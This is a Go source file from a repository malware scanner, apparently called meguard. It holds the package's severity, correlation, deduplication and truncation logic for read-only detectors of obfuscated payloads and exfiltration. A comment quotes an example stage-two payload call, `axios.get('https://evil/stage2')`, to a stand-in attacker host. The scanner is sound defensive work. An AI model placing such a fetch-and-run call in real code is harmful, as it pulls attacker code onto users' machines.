// Package analyze implements meguard's static scan: read-only detectors that
// inspect a repo's files on the host BEFORE any code runs, looking for
// obfuscated payloads, exfiltration channels, and other signals of hidden
// malicious behavior.
//
// SAFETY: every analyzer here only ever reads file bytes (via walkFiles); it
// never executes repo code, matching the trust tier of
// sandbox.DetectEcosystem (invariant 1 in CLAUDE.md: no host execution of
// repo code). internal/sandbox never imports this package (see
// internal/sandbox/import_guard_test.go): detection and containment are
// structurally independent, so a bug in scan cannot weaken the sandbox, and a
// bug in the sandbox cannot silently disable scan.
//
// Scan is advisory: it is a heuristic detector (regex, entropy, manifest
// inspection), not a prover. A clean report means "nothing matched", not
// "definitely safe" -- the sandbox's containment guarantee, not scan, is what
// makes it safe to run code that scan missed.
package analyze

import (
	"fmt"
	"path/filepath"
	"sort"
	"strings"
)

// Severity ranks a Finding's importance, lowest to highest.
type Severity int

const (
	Info Severity = iota
	Low
	Medium
	High
	Critical
)

func (s Severity) String() string {
	switch s {
	case Info:
		return "info"
	case Low:
		return "low"
	case Medium:
		return "medium"
	case High:
		return "high"
	case Critical:
		return "critical"
	default:
		return "unknown"
	}
}

// Finding is one detected signal.
type Finding struct {
	// Analyzer is which analyzer produced this finding, e.g. "regex",
	// "entropy", "manifest", "correlate".
	Analyzer string
	// Category groups related findings for the correlation pass (see
	// correlate in this file), e.g. "obfuscation", "exfil-channel",
	// "credential-path". Findings that should never contribute to
	// correlation (informational-only) may leave this empty.
	Category string
	Severity Severity
	// File is the path relative to the scanned repo root.
	File string
	// Line is 1-based; 0 when the finding is not tied to a specific line.
	Line int
	// Message describes what was found and why it matters.
	Message string
	// Snippet is a short, truncated excerpt of the matched context. It is
	// deliberately bounded so a finding never dumps a full obfuscated
	// payload into the report.
	Snippet string
	// Count is how many matches this finding represents after dedupe
	// (always >= 1).
	Count int
}

func (f Finding) String() string {
	loc := f.File
	if f.Line > 0 {
		loc = fmt.Sprintf("%s:%d", f.File, f.Line)
	}
	return fmt.Sprintf("[%s] %s %s: %s", f.Severity, f.Analyzer, loc, f.Message)
}

// Analyzer inspects a set of already-read files and returns the findings it
// detects.
//
// SAFETY: Analyze must only ever read from the ScannedFile values it is
// given. It must never execute repo code or shell out to anything the repo
// controls.
type Analyzer interface {
	Name() string
	Analyze(files []ScannedFile) ([]Finding, error)
}

// Report is the result of a full Scan.
type Report struct {
	Findings     []Finding
	FilesScanned int
	// ASTEnabled reports whether the AST analyzer produced real findings.
	// It is always false in this slice (see ast.go); ASTDisabledReason is
	// always set when it is false, so the absence is stated, never silent.
	ASTEnabled        bool
	ASTDisabledReason string
	// Errors are non-fatal skip reasons (unreadable files, a failed
	// analyzer). Scan still returns a usable Report when Errors is non-empty.
	Errors []string
}

// analyzers is the fixed set Scan runs against every ScannedFile.
func analyzers() []Analyzer {
	return []Analyzer{
		manifestAnalyzer{},
		entropyAnalyzer{},
		regexAnalyzer{},
	}
}

// Scan walks repoDir once and runs every analyzer against the result, plus
// the AST analyzer (a labeled no-op in this build; see ast.go). It is
// read-only: nothing here executes repo code.
func Scan(repoDir string) (Report, error) {
	files, skipped, err := walkFiles(repoDir)
	if err != nil {
		return Report{}, fmt.Errorf("scan %s: %w", repoDir, err)
	}

	report := Report{FilesScanned: len(files), Errors: skipped}

	for _, a := range analyzers() {
		findings, aerr := a.Analyze(files)
		if aerr != nil {
			report.Errors = append(report.Errors, fmt.Sprintf("%s: %v", a.Name(), aerr))
			continue
		}
		report.Findings = append(report.Findings, findings...)
	}

	ast := newASTAnalyzer()
	report.ASTEnabled = false
	report.ASTDisabledReason = ast.reason

	// Cap severity by file executability BEFORE correlating, so a prose file
	// (docs, changelogs) that merely mentions two suspicious terms cannot
	// combine into a loud aggregate finding. See capSeverity.
	for i := range report.Findings {
		report.Findings[i].Severity = capSeverity(report.Findings[i].File, report.Findings[i].Severity)
	}

	report.Findings = append(report.Findings, correlate(report.Findings)...)
	report.Findings = dedupeFindings(report.Findings)
	sortFindings(report.Findings)
	return report, nil
}

// proseExtensions are documentation/prose file types whose content cannot
// itself execute. A string appearing in one of these is evidence of nothing
// on its own: this repo's own CLAUDE.md and docs/decisions.md contain the
// literal example payload `axios.get('https://evil/stage2')`, and scan must
// not treat its own docs as a threat.
var proseExtensions = map[string]bool{
	".md":   true,
	".mdx":  true,
	".txt":  true,
	".rst":  true,
	".adoc": true,
}

// capSeverity bounds a finding's severity by whether its file can actually
// execute. Prose files are capped at Info; everything else is uncapped
// (executable source, and config files that get require'd/imported).
func capSeverity(relPath string, sev Severity) Severity {
	ext := strings.ToLower(filepath.Ext(relPath))
	if proseExtensions[ext] && sev > Info {
		return Info
	}
	return sev
}

// correlate looks for files that tripped findings from two or more distinct
// categories. Many individual categories here (recon, a lone credential
// path) are intentionally weak signals, common enough alone in legitimate
// code that flagging them loudly would be noise. But two DIFFERENT weak
// signals landing in the same file is a much stronger indicator than either
// alone, so this emits one additional High finding per file that clears that
// bar. It only considers files where the capped severity already rose above
// Info, which naturally excludes prose files (capSeverity holds them at Info)
// without a separate check here.
func correlate(findings []Finding) []Finding {
	categoriesByFile := map[string]map[string]bool{}
	maxSevByFile := map[string]Severity{}
	for _, f := range findings {
		if f.Category == "" || f.File == "" {
			continue
		}
		if categoriesByFile[f.File] == nil {
			categoriesByFile[f.File] = map[string]bool{}
		}
		categoriesByFile[f.File][f.Category] = true
		if f.Severity > maxSevByFile[f.File] {
			maxSevByFile[f.File] = f.Severity
		}
	}

	var files []string
	for file := range categoriesByFile {
		files = append(files, file)
	}
	sort.Strings(files)

	var extra []Finding
	for _, file := range files {
		cats := categoriesByFile[file]
		if len(cats) < 2 || maxSevByFile[file] <= Info {
			continue
		}
		var names []string
		for c := range cats {
			names = append(names, c)
		}
		sort.Strings(names)
		extra = append(extra, Finding{
			Analyzer: "correlate",
			Category: "correlated",
			Severity: High,
			File:     file,
			Message: fmt.Sprintf(
				"multiple suspicious signal categories co-located in this file (%s): individually weak signals combined are a stronger indicator",
				strings.Join(names, ", "),
			),
			Count: 1,
		})
	}
	return extra
}

// dedupeFindings collapses repeated matches of the same (analyzer, category,
// message, file) into one finding, so a single large or repetitive file
// cannot flood the report with near-duplicates. Message is part of the key,
// not just Category, because several distinct patterns share one Category
// (for example "obfuscation" covers the packer signature, the
// Function-constructor check, AND the global-stash check): collapsing on
// Category alone would silently discard genuinely different findings,
// keeping only whichever pattern matched first. The first occurrence's line
// and snippet are kept as a representative example; the message states the
// total count when there is more than one.
func dedupeFindings(in []Finding) []Finding {
	type key struct{ analyzer, category, message, file string }

	var order []key
	groups := map[key][]Finding{}
	for _, f := range in {
		k := key{f.Analyzer, f.Category, f.Message, f.File}
		if _, ok := groups[k]; !ok {
			order = append(order, k)
		}
		groups[k] = append(groups[k], f)
	}

	var out []Finding
	for _, k := range order {
		g := groups[k]
		first := g[0]
		total := 0
		for _, f := range g {
			c := f.Count
			if c < 1 {
				c = 1
			}
			total += c
		}
		first.Count = total
		if total > 1 {
			first.Message = fmt.Sprintf("%s (matched %d times in this file)", first.Message, total)
		}
		out = append(out, first)
	}
	return out
}

// sortFindings orders by severity (highest first), then file, then line, so
// output is deterministic and the most important findings surface first.
func sortFindings(f []Finding) {
	sort.SliceStable(f, func(i, j int) bool {
		if f[i].Severity != f[j].Severity {
			return f[i].Severity > f[j].Severity
		}
		if f[i].File != f[j].File {
			return f[i].File < f[j].File
		}
		return f[i].Line < f[j].Line
	})
}

// truncate shortens s to at most n runes (rune-safe, so it never splits a
// multi-byte character), so a finding's snippet never dumps a full
// obfuscated payload into the report.
func truncate(s string, n int) string {
	s = strings.TrimSpace(s)
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	return string(r[:n]) + "...(truncated)"
}
